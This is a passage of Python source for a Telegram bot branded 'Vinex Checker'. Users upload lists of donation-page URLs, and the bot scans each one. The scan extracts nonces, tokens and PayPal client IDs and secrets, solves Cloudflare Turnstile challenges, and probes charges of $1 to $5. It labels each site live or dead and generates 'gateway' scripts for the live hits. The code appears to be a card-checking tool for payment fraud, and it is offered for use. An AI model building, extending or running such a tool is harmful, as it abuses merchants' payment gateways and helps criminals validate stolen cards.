                if is_charge else f'[⚡] {SB("Hit Detected")} {ve("party")}')
        prices_count = len(tester.price_levels)
        cur_pid = tester.current_price_id or '—'

        caption = (
            f'{head}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{user_name} [VIP]")}\n'
            f'{vt("Status", B(status))} {ve("party")}\n'
            f'{vt("Response", f"<code>{display}</code>")}\n'
            f'{vt("Amount", f"<code>${tester.donation} {tester.currency}</code>")}\n'
            f'{vt("Gateway", f"<code>#{tester.gateway_type}</code>")}\n'
            f'{vt("Auth", f"<code>{tester.auth_method}</code>")}\n'
            f'{vt("Prices", f"<code>{prices_count} levels</code>")}\n'
            f'{vt("CurPID", f"<code>{cur_pid}</code>")}'
            f'{cf_badge}\n'
            f'{vsep()}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )

        sent = None
        for attempt in range(3):
            try:
                with open(fname, 'rb') as f:
                    kw = {'chat_id': chat_id, 'document': f, 'timeout': 180}
                    if attempt == 0:
                        kw['caption'] = caption
                        kw['parse_mode'] = 'HTML'
                        try: kw['message_effect_id'] = EFFECT_FIRE
                        except Exception: pass
                    elif attempt == 1:
                        kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                    sent = bot.send_document(**kw)
                if sent: break
            except Exception: continue

        if sent:
            safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("Delivered")} {ve("party")}')
            try: send_dice(chat_id, '🎉')
            except Exception: pass
            try: os.remove(fname)
            except Exception: pass
        else:
            safe_send_message(chat_id, f'{caption}\n\n[⚡] {SB("File delivery failed")}')
    except Exception: log.exception('cmd_paypal')

@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_mass[uid] < MASS_COOLDOWN: return
        user_last_mass[uid] = now
        if mass_active.get(uid, False):
            safe_send_message(message.chat.id, '⚠️ Job running. /stop first.')
            return
        msg = safe_send_message(message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n{vsep()}\n'
            f'{vt("Format", "One URL per line")}\n'
            f'{vt("Max", "10 MB")}\n'
            f'{vt("Dedup", "Smart")}\n'
            f'{vt("Amounts", "1$ → 5$")}\n'
            f'{vt("Engine", "v25.0 Ultimate")}\n'
            f'{vt("Live", "LIVE_RESPONSES (full)")}\n'
            f'{vt("Cloudflare", "Auto-detect")}')
        if msg:
            bot.register_next_step_handler(msg, handle_mass_file)
    except Exception: log.exception('cmd_mass')

@bot.message_handler(commands=['resume'])
def cmd_resume(message):
    try:
        uid = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(uid)
        if not progress:
            safe_send_message(chat_id, f'[⚡] {B("No saved progress")}.')
            return
        if mass_active.get(uid, False):
            safe_send_message(chat_id, '⚠️ Job running already.')
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(chat_id, f'✅ Complete ({processed}/{total})')
            clear_progress(uid)
            return
        links = progress.get('links', [])
        if not links:
            safe_send_message(chat_id, '❌ Corrupt progress.')
            clear_progress(uid)
            return
        safe_send_message(chat_id, f'♻️ Resuming {processed}/{total}...')
        threading.Thread(target=run_mass_job,
            args=(chat_id, uid, links, processed, progress), daemon=True).start()
    except Exception: log.exception('cmd_resume')

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        uid = message.from_user.id
        if mass_active.get(uid, False):
            mass_pause[uid] = True
            safe_send_message(message.chat.id, '🛑 Stopping...')
        else:
            safe_send_message(message.chat.id, '❌ No active job.')
    except Exception: pass

def handle_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, '❌ Send a .txt file.')
            return
        size = message.document.file_size or 0
        if size > MAX_FILE_SIZE:
            safe_send_message(message.chat.id, f'❌ File too large: {size // 1024} KB')
            return
        uid = message.from_user.id
        chat_id = message.chat.id
        try:
            fi = retry_call(bot.get_file, message.document.file_id, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Network: <code>{str(e)[:150]}</code>')
            return
        try:
            data = retry_call(bot.download_file, fi.file_path, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Download: <code>{str(e)[:150]}</code>')
            return
        if not data:
            safe_send_message(chat_id, '❌ Empty file.')
            return
        raw = data.decode('utf-8', errors='ignore').splitlines()
        links = []
        seen = set()
        dupes = 0
        for line in raw:
            s = safe_url(line.strip())
            if not s: continue
            k = normalize_url_key(s)
            if k in seen:
                dupes += 1
                continue
            seen.add(k)
            links.append(s)
        if not links:
            safe_send_message(chat_id, '❌ No valid URLs.')
            return
        total = len(links)
        progress = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'links': links, 'started_at': time.time(),
        }
        save_progress(uid, progress)
        dupe_msg = f'\n🗑️ Duplicates: <code>{dupes}</code>' if dupes else ''
        safe_send_message(chat_id,
            f'[⚡] {SB("Ready")} {ve("party")}\n{vsep()}\n'
            f'{vt("Loaded", f"<code>{total}</code> unique")}{dupe_msg}\n'
            f'{vt("Mode", "THOROUGH")}\n'
            f'{vt("Amounts", "1$ → 5$")}\n'
            f'{vsep()}\n'
            f'{ve("sound")} {SB("Launching")}...')
        threading.Thread(target=run_mass_job,
            args=(chat_id, uid, links, 0, progress), daemon=True).start()
    except Exception: log.exception('handle_mass_file')

def run_mass_job(chat_id, uid, links, start_idx, progress):
    total = len(links)
    processed = start_idx
    live = progress.get('live', 0)
    dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())
    mass_active[uid] = True
    mass_pause[uid] = False
    results_file = RESULTS_TMPL.format(uid, int(started_at))
    live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
    try: os.makedirs(live_dir, exist_ok=True)
    except Exception: pass

    state = {
        'processed': processed,
        'live': live,
        'dead': dead,
        'last_link': '',
        'last_resp': '',
        'last_live': False,
        'status': 'starting',
        'live_idx': 0,
        'stop': False,
    }
    shared = mass_shared[uid] = {'state': state, 'lock': threading.Lock()}

    status_msg = safe_send_message(chat_id,
        f'[⚡] {SB("Mass Scan Running")}\n{vsep()}\n'
        f'{vt("Total", f"<code>{total}</code>")}\n'
        f'{vt("Mode", "THOROUGH")}\n⏳ Starting...')

    def status_loop():
        last_text = ''
        while True:
            try:
                with shared['lock']:
                    st = dict(state)
                if st['stop']:
                    break
                processed_n = st['processed']
                live_n = st['live']
                dead_n = st['dead']
                last_link_s = st['last_link']
                last_resp_s = st['last_resp']
                last_live_b = st['last_live']
                status_s = st['status']
                pct = int((processed_n / total) * 100) if total else 0
                elapsed = time.time() - started_at
                spd = processed_n / elapsed if elapsed else 0
                eta = (total - processed_n) / spd if spd > 0 else 0
                filled = int((pct / 100) * 20)
                bar = '█' * filled + '░' * (20 - filled)
                if last_link_s:
                    icon = '✅' if last_live_b else '❌'
                    last = (f"{icon} <b>Last:</b>\n"
                            f"<code>{last_link_s[:60]}</code>\n"
                            f"💬 {last_resp_s[:60]}")
                else:
                    last = '⏳ Waiting...'
                stat_txt = ('🔄 Checking...' if status_s == 'checking' else '⏸️ Moving...')
                text = (
                    f'[⚡] {SB("Mass Scan")}\n{vsep()}\n'
                    f'{vt("Total", f"<code>{total}</code>")}\n'
                    f'{vt("Processed", f"<code>{processed_n}</code>")}\n'
                    f'{vt("Live", f"<code>{live_n}</code>")} {ve("party")}\n'
                    f'{vt("Dead", f"<code>{dead_n}</code>")}\n'
                    f'{vt("Progress", f"{pct}%")}\n'
                    f'<code>{bar}</code>\n'
                    f'{vsep()}\n{last}\n{vsep()}\n{stat_txt}\n'
                    f'{vt("Speed", f"<code>{spd:.2f}/s</code>")}\n'
                    f'{vt("ETA", f"{int(eta // 60)}m{int(eta % 60)}s")}')
                if text != last_text and status_msg:
                    safe_edit_message(chat_id, status_msg.message_id, text)
                    last_text = text
            except Exception:
                pass
            time.sleep(STATUS_UPDATE_EVERY)

    status_thread = threading.Thread(target=status_loop, daemon=True)
    status_thread.start()

    try:
        for idx in range(start_idx, total):
            if mass_pause.get(uid, False):
                with shared['lock']:
                    state['processed'] = processed
                    state['live'] = live
                    state['dead'] = dead
                    state['stop'] = True
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
                safe_send_message(chat_id, f'🛑 Stopped at {processed}/{total}\n♻️ /resume')
                return
            link = links[idx]
            with shared['lock']:
                state['status'] = 'checking'
            try:
                result = check_single_link(link, thorough=True)
            except Exception:
                result = {'link': str(link)[:100], 'live': False, 'respons': 'FATAL', 'tester': None}
            processed += 1
            resp = normalize_result(result.get('respons', 'Unknown'))[:100]
            is_live = result.get('live', False)
            with shared['lock']:
                state['processed'] = processed
                state['last_link'] = link
                state['last_resp'] = resp
                state['last_live'] = is_live
            try:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(f'{link} => {result.get("respons", "unknown")}\n')
            except Exception:
                pass
            bump_stat('checks')
            if is_live:
                live += 1
                with shared['lock']:
                    state['live'] = live
                    state['live_idx'] += 1
                    lidx = state['live_idx']
                bump_stat('live')
                try:
                    tester = result.get('tester')
                    code = generate_gateway_code(result['respons'], result['link'], tester)
                    gpath = os.path.join(live_dir, f'gateway_{lidx}_{int(time.time())}.py')
                    with open(gpath, 'w', encoding='utf-8') as f:
                        f.write(code)
                    cur = tester.currency if tester else 'USD'
                    auth = tester.auth_method if tester else 'none'
                    amt_val = result.get('amount', '1.00')
                    caption = (
                        f'[⚡] {SB("LIVE")} #{lidx} {ve("party")}\n'
                        f'{vsep()}\n'
                        f'{vt("URL", f"<code>{result["link"][:80]}</code>")}\n'
                        f'{vt("Response", resp[:80])}\n'
                        f'{vt("Amount", f"<code>${amt_val} {cur}</code>")}\n'
                        f'{vt("Auth", f"<code>{auth}</code>")}\n'
                        f'{vsep()}\n'
                        f'[⚡] {SB("Vinex")} - {B("Checker")}')
                    sent = safe_send_document(chat_id, gpath, caption=caption)
                    if sent:
                        try: os.remove(gpath)
                        except Exception: pass
                except Exception:
                    log.exception('live delivery')
            else:
                dead += 1
                with shared['lock']:
                    state['dead'] = dead
                bump_stat('dead')
            if processed % PROGRESS_SAVE_EVERY == 0:
                with shared['lock']:
                    state['processed'] = processed
                    state['live'] = live
                    state['dead'] = dead
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
            with shared['lock']:
                state['status'] = 'moving'
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        with shared['lock']:
            state['stop'] = True
        rate = int((live / total) * 100) if total else 0
        final = (
            f'[⚡] {SB("Mass Complete")} {ve("party")}\n{vsep()}\n'
            f'{vt("Total", f"<code>{total}</code>")}\n'
            f'{vt("Live", f"<code>{live}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{dead}</code>")}\n'
            f'{vt("Rate", f"<code>{rate}%</code>")}\n'
            f'{vt("Results", f"<code>{results_file}</code>")}')
        if status_msg:
            safe_edit_message(chat_id, status_msg.message_id, final)
        else:
            safe_send_message(chat_id, final)
        clear_progress(uid)
    except Exception:
        log.exception('run_mass_job')
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        with shared['lock']:
            state['processed'] = processed
            state['live'] = live
            state['dead'] = dead
            state['stop'] = True
        safe_send_message(chat_id, f'⚠️ Crashed at {processed}/{total}\n♻️ /resume')
    finally:
        mass_active[uid] = False
        mass_pause[uid] = False

@bot.message_handler(commands=['diag'])
def cmd_diag(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            safe_send_message(message.chat.id, '❌ Admin only.')
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(message.chat.id, 'Usage: <code>/diag URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(message.chat.id, '❌ Invalid link.')
            return
        msg = safe_send_message(message.chat.id, '🔬 Diagnosing...')
        if not msg: return
        tester = VinexTester(link)
        tester.Key()
        cf_info = '—'
        if tester.cf_detected:
            cf_info = '✅ Solved' if tester.cf_solved else '⚠️ Detected (solver disabled)'
        form_s = tester.id_form2 or 'NONE'
        nonce_s = tester.nonec or 'NONE'
        cid_s = (tester.client_id or '-')[:24]
        sec_s = 'YES' if tester.client_secret else 'NO'
        cur_pid_s = tester.current_price_id or '-'
        report = (
            f'[⚡] {SB("Diagnostics v25.0")}\n{vsep()}\n'
            f'{vt("URL", f"<code>{link[:80]}</code>")}\n'
            f'{vt("GW", f"<code>{tester.gateway_type}</code>")}\n'
            f'{vt("HTML", f"<code>{len(tester.page_html)}b</code>")}\n'
            f'{vt("Content", f"<code>{len(tester.all_content)}b</code>")}\n'
            f'{vt("Form", f"<code>{form_s}</code>")}\n'
            f'{vt("Nonce", f"<code>{nonce_s}</code>")}\n'
            f'{vt("Tokens", f"<code>{len(tester.token_candidates)}</code>")}\n'
            f'{vt("Verified", f"<code>{tester.token_verified}</code>")}\n'
            f'{vt("ClientID", f"<code>{cid_s}</code>")}\n'
            f'{vt("Secret", f"<code>{sec_s}</code>")}\n'
            f'{vt("Currency", f"<code>{tester.currency}</code>")}\n'
            f'{vt("Min", f"<code>{tester.minimum}</code>")}\n'
            f'{vt("Fields", f"<code>{len(tester.form_fields)}</code>")}\n'
            f'{vt("Auth", f"<code>{tester.auth_method}</code>")}\n'
            f'{vt("Prices", f"<code>{len(tester.price_levels)} levels</code>")}\n'
            f'{vt("CurPID", f"<code>{cur_pid_s}</code>")}\n'
            f'{vt("Cloudflare", cf_info)}'
        )
        safe_edit_message(message.chat.id, msg.message_id, report)
    except Exception: log.exception('cmd_diag')

# ═══════════════════════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == 'stats')
def cb_stats(call):
    try: bot.answer_callback_query(call.id, '📊'); cmd_stats(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'help')
def cb_help(call):
    try: bot.answer_callback_query(call.id); cmd_help(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'stop')
def cb_stop(call):
    try: bot.answer_callback_query(call.id, '🛑'); cmd_stop(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'luck')
def cb_luck(call):
    try: bot.answer_callback_query(call.id, '🎲'); cmd_luck(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_paypal')
def cb_howto_paypal(call):
    try:
        bot.answer_callback_query(call.id, '💡')
        safe_send_message(call.message.chat.id,
            f'[⚡] {SB("Ready")}\n\nType:\n<code>/paypal https://your-site.com/donate</code>',
            effect=EFFECT_HEART)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_mass')
def cb_howto_mass(call):
    try:
        bot.answer_callback_query(call.id, '📦')
        safe_send_message(call.message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n\n1. /mass\n2. Upload .txt\n3. Watch 🚀',
            effect=EFFECT_THUMBS)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'emojis')
def cb_emojis(call):
    try:
        bot.answer_callback_query(call.id, '🎨')
        groups = {
            'Money': ['cash', 'moneybag', 'moneywings', 'money2'],
            'Status': ['warn', 'stop', 'ban', 'shield', 'blue_bolt', 'rocket'],
            'Fun': ['party', 'gift', 'laugh', 'smile', 'scream', 'grimace'],
            'UI': ['play', 'pause', 'record', 'sound', 'gear', 'circle'],
            'Misc': ['shop', 'soon', 'globe'],
        }
        lines = [f'[⚡] {B(g)}:\n' + ' '.join(ve(k) for k in keys)
                 for g, keys in groups.items()]
        text = (f'[⚡] {SB("Vinex Emoji Pack")} {ve("party")}\n{vsep()}\n'
                + '\n\n'.join(lines) +
                f'\n{vsep()}\n{vt("Count", f"<code>{len(VINEX_CE)}</code>")}')
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(call.message.chat.id, text, reply_markup=kb, effect=EFFECT_FIRE)
    except Exception: log.exception('cb_emojis')

@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
def cb_back_start(call):
    try:
        bot.answer_callback_query(call.id)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception: pass
        cmd_start(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
def cb_feedback(call):
    try:
        bot.answer_callback_query(call.id)
        uid = call.from_user.id
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', callback_data='back_start'))
        try:
            bot.edit_message_text(chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text='✍️ Send your message:', parse_mode='HTML', reply_markup=kb)
        except Exception: pass
        waiting_users[uid] = True
    except Exception: pass

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def handle_user_msg(message):
    try:
        uid = message.from_user.id
        text = message.text or '(non-text)'
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Reply', 'success', callback_data=f'reply_{uid}'))
        safe_send_message(OWNER_ID,
            f'📩 New Message\n👤 {message.from_user.first_name}\n'
            f'🆔 <code>{uid}</code>\n💬 {text}', reply_markup=kb)
        safe_send_message(uid, '✅ Sent.')
        waiting_users.pop(uid, None)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('reply_'))
def cb_reply(call):
    try:
        target = int(call.data.split('_', 1)[1])
        reply_mode[call.from_user.id] = target
        safe_send_message(call.from_user.id, '✍️ Reply:')
    except Exception: pass

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def handle_admin_reply(message):
    try:
        target = reply_mode[message.from_user.id]
        safe_send_message(target, f'💬 <b>Admin:</b>\n\n{message.text or ""}')
        safe_send_message(OWNER_ID, '✅ Sent.')
        reply_mode.pop(message.from_user.id, None)
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  ADMIN
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=['block2'])
def admin_block(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit(): return
        uid = parts[1].strip()
        if uid in open(BLOCK_FILE).read().splitlines():
            safe_send_message(message.chat.id, '⚠️ Already blocked.')
            return
        with open(BLOCK_FILE, 'a') as f: f.write(f'{uid}\n')
        safe_send_message(message.chat.id, f'✅ Blocked <code>{uid}</code>')
    except Exception: pass

@bot.message_handler(commands=['unblock2'])
def admin_unblock(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit(): return
        uid = parts[1].strip()
        lines = open(BLOCK_FILE).readlines()
        with open(BLOCK_FILE, 'w') as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send_message(message.chat.id, f'✅ Unblocked <code>{uid}</code>')
    except Exception: pass

@bot.message_handler(commands=['blocklist'])
def admin_blocklist(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        blocked = [l.strip() for l in open(BLOCK_FILE).read().splitlines() if l.strip()]
        if not blocked:
            safe_send_message(message.chat.id, '📋 Empty.')
            return
        text = '📋 <b>Blocked:</b>\n'
        for i, u in enumerate(blocked, 1):
            text += f'{i}. <code>{u}</code>\n'
        safe_send_message(message.chat.id, text)
    except Exception: pass

@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2: return
        txt = parts[1]
        users = [l.strip() for l in open(USERS_FILE).read().splitlines() if l.strip()]
        sent = 0; failed = 0
        for u in users:
            try:
                if safe_send_message(int(u), txt): sent += 1
                else: failed += 1
                time.sleep(0.05)
            except Exception: failed += 1
        safe_send_message(message.chat.id, f'📢 Done. ✅{sent} ❌{failed}')
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  SETUP + MAIN
# ═══════════════════════════════════════════════════════════════
def vinex_setup():
    try:
        bot.set_my_commands([
            types.BotCommand('start', '🌟 Menu'),
            types.BotCommand('paypal', '⚡ Single scan'),
            types.BotCommand('mass', '📦 Bulk scan'),
            types.BotCommand('resume', '♻️ Resume'),
            types.BotCommand('stop', '🛑 Stop'),
            types.BotCommand('stats', '📊 Stats'),
            types.BotCommand('luck', '🎲 Roll dice'),
            types.BotCommand('mood', '🎭 Random emoji'),
            types.BotCommand('diag', '🔬 Diagnostics'),
            types.BotCommand('help', '💡 Guide'),
            types.BotCommand('ping', '🏓 Health'),
        ])
    except Exception as e: log.warning(f'commands: {e}')
    try:
        bot.set_chat_menu_button(menu_button=types.MenuButtonCommands(type='commands'))
    except Exception: pass

if __name__ == '__main__':
    log.info('VINEX v25.0 FINAL starting...')
    print(r'''
    __  ___  _  __ ______ _  __
   / / / _ \/ |/ // __/ / |/ /
  / /_/ // /    // _/ /    /
 /___/_//_/_/|_/___/_/_/|_/
    v25.0 FINAL — Ultimate Edition
    ''')
    try: cleanup_old_files()
    except Exception: pass
    vinex_setup()
    if _turnstile.enabled:
        log.info(f'Turnstile solver enabled: {TS_API_URL}')
    else:
        log.info('Turnstile solver disabled (TS_API_URL/TS_API_KEY not set)')
    while True:
        try:
            log.info('Polling loop starting...')
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                  skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt:
            log.info('Manual shutdown.')
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'Polling crash: {str(e)[:200]}')
            if '429' in err or 'too many' in err:
                try: wait = int(err.split('retry after ')[1].split()[0])
                except Exception: wait = 30
                time.sleep(wait)
            elif '502' in err or 'bad gateway' in err:
                time.sleep(20)
            else:
                time.sleep(15)
